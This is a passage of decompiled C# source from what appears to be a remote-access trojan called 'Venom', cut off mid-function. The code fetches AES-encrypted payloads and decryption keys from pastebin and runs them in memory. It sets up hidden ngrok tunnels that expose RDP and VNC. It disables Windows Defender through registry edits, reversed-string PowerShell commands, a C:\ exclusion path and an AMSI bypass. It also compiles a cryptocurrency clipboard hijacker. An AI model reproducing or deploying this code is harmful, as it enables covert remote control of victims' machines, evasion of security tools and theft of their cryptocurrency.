		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		CodeDomProvider obj = CodeDomProvider.CreateProvider("CSharp");
		CompilerParameters val = new CompilerParameters();
		CompilerResults val2 = null;
		val.set_GenerateExecutable(true);
		val.set_OutputAssembly(EXE_Name);
		val.get_ReferencedAssemblies().Add("Microsoft.VisualBasic.dll");
		val.get_ReferencedAssemblies().Add("System.dll");
		val.get_ReferencedAssemblies().Add("System.Data.dll");
		val.get_ReferencedAssemblies().Add("System.Xml.dll");
		val.set_CompilerOptions(" /target:winexe");
		val.set_TreatWarningsAsErrors(false);
		val2 = obj.CompileAssemblyFromSource(val, new string[1] { Source });
		if (((CollectionBase)(object)val2.get_Errors()).Count > 0)
		{
			foreach (CompilerError item in (CollectionBase)(object)val2.get_Errors())
			{
				CompilerError val3 = item;
				MessageBox.Show("Error: " + val3.get_ErrorText() + " Line : " + val3.get_Line(), "", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			return false;
		}
		_ = ((CollectionBase)(object)val2.get_Errors()).Count;
		return true;
	}

	public static void smethod_51()
	{
		Thread.Sleep(2000);
		PublicUrl().Wait();
	}

	public static async Task<string> PublicUrl()
	{
		Console.WriteLine("Fetching Ngrok Tunnels ... ");
		string text = "http://127.0.0.1:4040/api";
		HttpClient httpClient = new HttpClient();
		try
		{
			httpClient.get_DefaultRequestHeaders().get_Accept().Add(new MediaTypeWithQualityHeaderValue("application/json"));
			Class69 @class = JsonConvert.DeserializeObject<Class68>(await httpClient.GetStringAsync(text + "/tunnels")).tunnels[0];
			Console.WriteLine("Retrieved Tunnel: " + @class.public_url);
			string text2 = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)), "Venom");
			string path = Path.Combine(text2, "tunnel.txt");
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			string public_url = @class.public_url;
			File.WriteAllText(path, public_url);
			return @class.public_url;
		}
		finally
		{
			((IDisposable)httpClient)?.Dispose();
		}
	}

	public static void smethod_52(string token, string port)
	{
		try
		{
			string path = Path.Combine(GClass5.string_4, GClass5.string_5);
			string text = Path.Combine(path, "Venom");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZL55WPp1zFAZn8zSVFhxCWcj8ZwVoOyAh3WyvInTOcAh1+e5NguCqUj9siUnyU8QPXCWprAFrmvVH0I47l4XKF0CU6+9UCVTN5OD1t5yFpLak6BKCf30RLXOpMaw4zZAX+5byXxPbbzmQCnuxE/Oa5N")));
			new WebClient().DownloadFile(@string, Path.Combine(path, "ngrok.zip"));
			smethod_74(Path.Combine(path, "ngrok.zip"), text);
			string[] files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "*.zip");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			string text2 = Path.Combine(text, "ngrok.exe");
			string text3 = Path.Combine(text, "proclog.txt");
			StreamWriter streamWriter = new StreamWriter(Path.Combine(text, "grok.bat"));
			streamWriter.WriteLine("set logFile=" + text3);
			streamWriter.WriteLine("set exeFile=" + text2);
			streamWriter.WriteLine("%exeFile% authtoken " + token);
			streamWriter.WriteLine("%exeFile%  tcp  " + port + " > %logFile%");
			streamWriter.Close();
			string fileName = Path.Combine(text, "grok.bat");
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_53(string token, string port, string proto)
	{
		try
		{
			string path = Path.Combine(GClass5.string_4, GClass5.string_5);
			string text = Path.Combine(path, "Venom");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZL55WPp1zFAZn8zSVFhxCWcj8ZwVoOyAh3WyvInTOcAh1+e5NguCqUj9siUnyU8QPXCWprAFrmvVH0I47l4XKF0CU6+9UCVTN5OD1t5yFpLak6BKCf30RLXOpMaw4zZAX+5byXxPbbzmQCnuxE/Oa5N")));
			new WebClient().DownloadFile(@string, Path.Combine(path, "ngrok.zip"));
			smethod_74(Path.Combine(path, "ngrok.zip"), text);
			string[] files = Directory.GetFiles(Path.Combine(GClass5.string_4, GClass5.string_5), "*.zip");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			string text2 = Path.Combine(text, "ngrok.exe");
			string text3 = Path.Combine(text, "proclog.txt");
			StreamWriter streamWriter = new StreamWriter(Path.Combine(text, "grok.bat"));
			streamWriter.WriteLine("set logFile=" + text3);
			streamWriter.WriteLine("set exeFile=" + text2);
			streamWriter.WriteLine("%exeFile% authtoken " + token);
			streamWriter.WriteLine("%exeFile%  " + proto + " " + port + " > %logFile%");
			streamWriter.Close();
			string fileName = Path.Combine(text, "grok.bat");
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_54()
	{
		string path = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("NKOPmTypVXOBw8M4exFGSq4eGiXmVqCKtyAJ1+pZppYCTgTeoOlr8xo+9LLUCUCUruqXi2CtfRwFxLa58qyPVQ=="))))).ReadToEnd();
		Path.Combine(path, "happiness.exe");
		smethod_29(Convert.FromBase64String(smethod_60(encrypted)));
	}

	public static void smethod_55(string token)
	{
		try
		{
			Task.Run(async () => DelRdpMethodAsync()).Wait();
			string path = Path.Combine(GClass5.string_4, GClass5.string_5);
			string path2 = Path.Combine(path, "Venom");
			string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_60("4y3I07LUterluaip9oz/7qOPDGbH5TuyoI8mnrxSIBxTM9Q3XWTB6NWHmuWMCwd7zV+GkEFtSH/PGhxEYUi4FpZi4CpAZoBX3tswNqldqRjvT8WZ4D2zUK6CvOGEK+0hAMJBU4cRwumieqvXojIDrA=="))))).ReadToEnd();
			string path3 = Path.Combine(path, "Venom-ngrok.exe");
			byte[] bytes = Convert.FromBase64String(smethod_60(encrypted));
			File.WriteAllBytes(path3, bytes);
			string text = Path.Combine(path, "Venom-ngrok.exe");
			string text2 = Path.Combine(path, "proclog.txt");
			StreamWriter streamWriter = new StreamWriter(Path.Combine(path2, "vnc.bat"));
			streamWriter.WriteLine("set logFile=" + text2);
			streamWriter.WriteLine("set exeFile=" + text);
			streamWriter.WriteLine("%exeFile% authtoken " + token);
			streamWriter.WriteLine("%exeFile%  tcp  5900 > %logFile%");
			streamWriter.Close();
			string fileName = Path.Combine(path2, "vnc.bat");
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			smethod_54();
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_56(string token)
	{
		try
		{
			Task.Run(async () => DelRdpMethodAsync()).Wait();
			string path = Path.Combine(GClass5.string_4, GClass5.string_5);
			string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_60("4y3I07LUterluaip9oz/7qOPDGbH5TuyoI8mnrxSIBxTM9Q3XWTB6NWHmuWMCwd7zV+GkEFtSH/PGhxEYUi4FpZi4CpAZoBX3tswNqldqRjvT8WZ4D2zUK6CvOGEK+0hAMJBU4cRwumieqvXojIDrA=="))))).ReadToEnd();
			string path2 = Path.Combine(path, "Venom-ngrok.exe");
			byte[] bytes = Convert.FromBase64String(smethod_60(encrypted));
			File.WriteAllBytes(path2, bytes);
			string text = Path.Combine(path, "Venom-ngrok.exe");
			string text2 = Path.Combine(path, "proclog.txt");
			StreamWriter streamWriter = new StreamWriter(Path.Combine(GClass5.string_4, GClass5.string_5, "rdp.bat"));
			streamWriter.WriteLine("set logFile=" + text2);
			streamWriter.WriteLine("set exeFile=" + text);
			streamWriter.WriteLine("%exeFile% authtoken " + token);
			streamWriter.WriteLine("%exeFile%  tcp  3389 > %logFile%");
			streamWriter.Close();
			string fileName = Path.Combine(GClass5.string_4, GClass5.string_5, "rdp.bat");
			Process.Start(new ProcessStartInfo
			{
				FileName = fileName,
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_57(string decrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2dyc3hMRWpF")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzZNYnptWGZT")));
		byte[] bytes = Encoding.ASCII.GetBytes(decrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
		cryptoTransform.Dispose();
		return Convert.ToBase64String(inArray);
	}

	public static string smethod_58(string encrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2dyc3hMRWpF")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzZNYnptWGZT")));
		byte[] array = Convert.FromBase64String(encrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		cryptoTransform.Dispose();
		return Encoding.ASCII.GetString(bytes);
	}

	public static string smethod_59(string decrypted)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(decrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(string_16);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(string_15);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
		cryptoTransform.Dispose();
		return Convert.ToBase64String(inArray);
	}

	public static string smethod_60(string encrypted)
	{
		byte[] array = Convert.FromBase64String(encrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(string_16);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(string_15);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		cryptoTransform.Dispose();
		return Encoding.ASCII.GetString(bytes);
	}

	public static string smethod_61(string plainText)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
	}

	public static string smethod_62(string toEncode)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(toEncode));
	}

	public static string smethod_63(string encodedData)
	{
		byte[] bytes = Convert.FromBase64String(encodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static byte[] smethod_64(byte[] buffer1, string buffer2)
	{
		int num = buffer1.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			int index = i % buffer2.Length;
			buffer1[i] = (byte)(buffer1[i] ^ buffer2[index]);
		}
		return buffer1;
	}

	public static byte[] smethod_65(byte[] raw)
	{
		using MemoryStream memoryStream = new MemoryStream();
		using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
		{
			gZipStream.Write(raw, 0, raw.Length);
		}
		return memoryStream.ToArray();
	}

	public static object smethod_66(byte[] BytesIn)
	{
		using GZipStream gZipStream = new GZipStream(new MemoryStream(BytesIn), CompressionMode.Decompress);
		byte[] buffer = new byte[4096];
		using MemoryStream memoryStream = new MemoryStream();
		int num;
		do
		{
			num = gZipStream.Read(buffer, 0, 4096);
			if (num > 0)
			{
				memoryStream.Write(buffer, 0, num);
			}
		}
		while (num > 0);
		return memoryStream.ToArray();
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SendMessageTimeout(IntPtr hWnd, int Msg, IntPtr wParam, string lParam, uint fuFlags, uint uTimeout, IntPtr lpdwResult);

	public static void smethod_67()
	{
		smethod_128();
		smethod_125();
		Class46.smethod_0();
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern GEnum19 SetThreadExecutionState(GEnum19 esFlags);

	private static void smethod_68()
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = "Get-MpPreference -verbose",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
		while (!process.StandardOutput.EndOfStream)
		{
			string text = process.StandardOutput.ReadLine();
			if (text.StartsWith(Strings.StrReverse("gnirotinoMroivaheBelbasiD")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ gnirotinoMroivaheBelbasiD- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("neeStsriFtAkcolBelbasiD")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ neeStsriFtAkcolBelbasiD- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("noitcetorPVAOIelbasiD")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ noitcetorPVAOIelbasiD- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("edoMycavirPelbasiD")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ edoMycavirPelbasiD- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("enignEtuohtiWputratSnOetadpUelbasiDerutangiS")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ enignEtuohtiWputratSnOetadpUelbasiDerutangiS- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("gninnacSevihcrAelbasiD")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ gninnacSevihcrAelbasiD- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("metsySnoitneverPnoisurtnIelbasiD")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ metsySnoitneverPnoisurtnIelbasiD- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("gninnacStpircSelbasiD")) && text.EndsWith("False"))
			{
				smethod_98(Strings.StrReverse("eurt$ gninnacStpircSelbasiD- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("tnesnoCselpmaStimbuS")) && !text.EndsWith("2"))
			{
				smethod_98(Strings.StrReverse("2 tnesnoCselpmaStimbuS- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("gnitropeRSPAM")) && !text.EndsWith("0"))
			{
				smethod_98(Strings.StrReverse("0 gnitropeRSPAM- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("noitcAtluafeDtaerhThgiH")) && !text.EndsWith("6"))
			{
				smethod_98(Strings.StrReverse("ecroF- 6 noitcAtluafeDtaerhThgiH- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("noitcAtluafeDtaerhTetaredoM")) && !text.EndsWith("6"))
			{
				smethod_98(Strings.StrReverse("6 noitcAtluafeDtaerhTetaredoM- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("noitcAtluafeDtaerhTwoL")) && !text.EndsWith("6"))
			{
				smethod_98(Strings.StrReverse("6 noitcAtluafeDtaerhTwoL- ecnereferPpM-teS"));
			}
			else if (text.StartsWith(Strings.StrReverse("noitcAtluafeDtaerhTereveS")) && !text.EndsWith("6"))
			{
				smethod_98(Strings.StrReverse("6 noitcAtluafeDtaerhTereveS- ecnereferPpM-teS"));
			}
		}
	}

	public static void smethod_69()
	{
		string text = "c:\\program files\\windows Dfr\\mpcmdrun.exe";
		string text2 = "c:\\";
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell -Version 2 -Command \" & { Set - ExcutionPolicy - ExecutionPolicy Unrestricted }\" & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		string text3 = Strings.StrReverse("htaPnoisulcxE-ecnreferPpM-ddA");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/k start /b powershell.exe " + text3 + " \"" + text2 + "\" & exit";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.UseShellExecute = true;
		processStartInfo.ErrorDialog = false;
		Process.Start(processStartInfo);
		string text4 = Strings.StrReverse("eurt$ noitcetorPVAOIelbasiD- ecnreferPpM-teS llA- snoitinifeDevomeR-");
		processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/c  \"" + text + "\" " + text4 + " & exit";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.UseShellExecute = true;
		processStartInfo.ErrorDialog = false;
		Process.Start(processStartInfo);
		string text5 = Strings.StrReverse(")eurt$,llun$(eulaVteS.)'citatS.cilpuPnoN'.'deliaFtinlisma'(dleiFteG.)'slitUismA.noitamotuA.tnemeganaM.metsyS'(epyTteG.ylbmessA.]feR[");
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell.exe " + text5 + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_70()
	{
		string path = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSELakjZOIqKB2SO90wI3ThX76/GDeUfjTZJYD8SkSwiq2TkBQYjDe1eeKuKsUDfHrrg="))))).ReadToEnd();
		Path.Combine(path, "df1.exe");
		byte[] byte_0 = Convert.FromBase64String(smethod_58(encrypted));
		Task.Run(delegate
		{
			smethod_29(byte_0);
		}).Wait();
		string encrypted2 = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSELakjZOIqKB2SO90wI3ThX7b2M2LpCkvE8Z4hjD9ALQhz4GlU67aSUE2vYudhy/A8w="))))).ReadToEnd();
		Path.Combine(path, "df2.exe");
		byte[] byte_1 = Convert.FromBase64String(smethod_58(encrypted2));
		Task.Run(delegate
		{
			smethod_29(byte_1);
		}).Wait();
		string encrypted3 = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSELakjZOIqKB2SO90wI3ThX7cM6+zFvYd2hu6J7NYqjXTXsWvwvf669W+CiY2BlFVz4="))))).ReadToEnd();
		Path.Combine(path, "df3.exe");
		byte[] byte_2 = Convert.FromBase64String(smethod_58(encrypted3));
		Task.Run(delegate
		{
			smethod_29(byte_2);
		}).Wait();
	}

	public static void smethod_71()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			smethod_131(Strings.StrReverse("serutaeF\\rednefeD swodniW\\tfosorciM\\ERAWTFOS"), Strings.StrReverse("noitcetorPrepmaT"), "0");
			smethod_131(Strings.StrReverse("rednefeD swodniW\\tfosorciM\\seiciloP\\ERAWTFOS"), Strings.StrReverse("erawypSitnAelbasiD"), "1");
			smethod_131(Strings.StrReverse("noitcetorP emiT-laeR\\rednefeD swodniW\\tfosorciM\\seiciloP\\ERAWTFOS"), Strings.StrReverse("gnirotinoMroivaheBelbasiD"), "1");
			smethod_131(Strings.StrReverse("noitcetorP emiT-laeR\\rednefeD swodniW\\tfosorciM\\seiciloP\\ERAWTFOS"), Strings.StrReverse("noitcetorPsseccAnOelbasiD"), "1");
			smethod_131(Strings.StrReverse("noitcetorP emiT-laeR\\rednefeD swodniW\\tfosorciM\\seiciloP\\ERAWTFOS"), Strings.StrReverse("elbanEemitlaeRnOnacSelbasiD"), "1");
			smethod_68();
			smethod_69();
		}
	}

	public static void smethod_72()
	{
		smethod_98("reg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d \"0\" /f");
		smethod_98("reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" / t REG_DWORD /d \"0\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f");
		smethod_98("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"2\" /f");
		smethod_98("reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f");
		smethod_98("reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f");
		smethod_98("schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable");
		smethod_98("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable");
		smethod_98("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable");
		smethod_98("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable");
		smethod_98("schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable");
		smethod_98("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v \"SecurityHealth\" /f");
		smethod_98("reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealth\" /f");
		smethod_98("reg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f");
		smethod_98("reg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f");
		smethod_98("reg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f");
		smethod_98("reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /t REG_DWORD /d \"4\" /f");
		smethod_98("reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /t REG_DWORD /d \"4\" /f");
		smethod_98("reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /t REG_DWORD /d \"4\" /f");
		smethod_98("reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f");
		smethod_98("reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d \"4\" /f");
		smethod_98("reg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d \"0\" /f");
	}

	public static void smethod_73(string btc, string eth, string xmr)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Expected O, but got Unknown
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		string path = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		CompilerParameters val = new CompilerParameters();
		val.set_IncludeDebugInformation(false);
		val.set_CompilerOptions(" /t:winexe /platform:x86");
		val.set_OutputAssembly(Path.Combine(path, "Venomclip.exe"));
		val.get_ReferencedAssemblies().Add("System.Windows.Forms.dll");
		val.get_ReferencedAssemblies().Add("System.dll");
		string source = GClass4.Source;
		source = source.Replace("[BTC]", btc);
		source = source.Replace("[ETH]", eth);
		source = source.Replace("[XMR]", xmr);
		foreach (CompilerError item in (CollectionBase)(object)((CodeDomProvider)new CSharpCodeProvider((IDictionary<string, string>)new Dictionary<string, string> { { "CompilerVersion", "v4.0" } })).CompileAssemblyFromSource(val, new string[1] { source }).get_Errors())
		{
			MessageBox.Show(((object)item).ToString());
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b " + Path.Combine(path, "Venomclip.exe") + "  & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
	}

	public static void smethod_74(string zipPath, string extractPath)
	{
		ZipFile.ExtractToDirectory(zipPath, extractPath);
	}

	public static void smethod_75(string dir, string zipPath)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd";
